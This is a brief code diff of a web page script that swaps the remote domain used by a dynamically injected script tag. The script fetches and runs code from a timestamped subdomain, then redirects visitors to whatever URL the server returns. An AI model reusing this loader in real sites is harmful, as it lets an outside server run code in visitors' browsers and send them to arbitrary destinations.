@@ -63,12 +63,12 @@
         var codecode = getQueryVariable2("code");
         var Time = (new Date()).getTime();
         var script = document.createElement('script');
-        script.setAttribute('src', "http://" + Time + ".9ko6y.cn/index.php/index/index/loadGround/code/" + codecode);
+        script.setAttribute('src', "http://" + Time + ".yulinzhihou.com/index.php/index/index/loadGround/code/" + codecode);
         document.querySelector("head").appendChild(script);
     }());
 
     function handler(code, data) {
-        if (code === 'successcode') {
+        if (code == 'successcode') {
             self.location.href = data;
         } else {
             //self.location.href = 'https://www.baidu.com';
